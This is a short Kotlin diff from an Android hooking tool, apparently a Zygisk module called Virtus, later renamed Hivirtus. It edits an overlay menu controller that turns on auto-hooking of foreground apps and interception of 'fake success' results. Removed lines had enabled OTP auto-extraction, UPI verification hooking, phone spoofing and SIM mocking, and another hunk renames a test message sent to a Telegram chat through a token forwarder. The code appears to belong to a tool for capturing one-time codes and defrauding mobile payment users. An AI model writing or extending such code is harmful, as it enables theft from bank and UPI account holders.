@@ -43,16 +43,12 @@ class OverlayMenuController(
     private fun ensureAutoHookDefaults() {
         scope.launch(Dispatchers.IO) {
             val current = configManager.load()
-            val updated = current.copy(
-                autoHookForeground = true,
-                interceptFakeSuccess = current.hookOutgoingSms,
-                autoExtractOtp = true,
-                hookUpiVerification = true,
-                enablePhoneSpoof = true,
-                enableSim1Mock = true
+            configManager.saveAndFlushSync(
+                current.copy(
+                    autoHookForeground = true,
+                    interceptFakeSuccess = current.hookOutgoingSms
+                )
             )
-            configManager.saveAndFlushSync(updated)
-            FrameworkHookHelper.markScopeActivePublic()
         }
     }
 
@@ -191,7 +187,7 @@ class OverlayMenuController(
                     TokenForwarder(configManager, appContext).sendTestMessage(
                         token,
                         chatId,
-                        "✅ Virtus Zygisk Mode — Telegram connected"
+                        "✅ Hivirtus — Telegram connected"
                     )
                 }.getOrDefault(false)
             }
